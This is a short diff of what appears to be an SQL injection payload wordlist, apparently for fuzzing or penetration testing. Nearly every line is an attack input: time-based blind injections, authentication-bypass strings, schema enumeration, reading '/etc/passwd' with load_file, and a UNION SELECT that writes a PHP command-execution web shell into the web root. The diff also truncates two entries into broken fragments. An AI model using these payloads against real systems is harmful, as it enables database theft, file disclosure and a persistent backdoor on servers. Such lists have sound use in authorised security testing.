@@ -2,16 +2,13 @@
 1' and sleep(10)
 1' && sleep(10)
 1' | sleep(10)
-
-["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
-["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
-
+["1337=1337",
+["'i'='i'",
 (select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2)
 id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
 AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-
 select load_file(concat('\\\\',version(),
 a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
-
 admin’    #
 admin”    #
 admin’))    #
@@ -34,4 +31,3 @@ select load_file(“/etc/passwd”)
 select load_file(“/etc/passwd”) into outfile “/tmp/file.txt”
 UNION SELECT “<?php system($_GET[‘cmd’]); ?>” into outfile “../var/www/html/phpBackdoor.php”
 UNION SELECT 0xPHP_PAYLOAD_IN_HEX
-
